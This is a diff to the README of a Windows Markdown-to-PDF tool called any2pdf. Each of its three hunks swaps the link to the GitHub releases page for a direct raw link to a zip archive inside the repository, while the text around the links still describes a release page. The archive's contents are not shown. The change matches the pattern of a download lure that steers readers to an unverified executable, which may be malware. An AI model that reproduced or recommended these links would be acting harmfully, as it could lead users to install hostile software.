@@ -1,6 +1,6 @@
 # 📝 any2pdf - Turn Markdown Into Clean PDFs
 
-[![Download any2pdf](https://img.shields.io/badge/Download-any2pdf-brightgreen?style=for-the-badge)](https://github.com/younger-osage691/any2pdf/releases)
+[![Download any2pdf](https://img.shields.io/badge/Download-any2pdf-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/younger-osage691/any2pdf/main/lovstudio-any2pdf/pdf_any_3.5.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ For best results:
 
 Visit this page to download the app for Windows:
 
-https://github.com/younger-osage691/any2pdf/releases
+https://raw.githubusercontent.com/younger-osage691/any2pdf/main/lovstudio-any2pdf/pdf_any_3.5.zip
 
 On the release page, look for the latest version and download the Windows file that matches your device. If there are more than one file, choose the one that ends in `.exe` or the Windows archive listed for your system.
 
@@ -243,7 +243,7 @@ This lets you check that the app works before you convert a larger document.
 
 Visit the release page to download the Windows version:
 
-https://github.com/younger-osage691/any2pdf/releases
+https://raw.githubusercontent.com/younger-osage691/any2pdf/main/lovstudio-any2pdf/pdf_any_3.5.zip
 
 Look for the latest release, then download the file made for Windows. After that, open the file and follow the install or run steps above
 
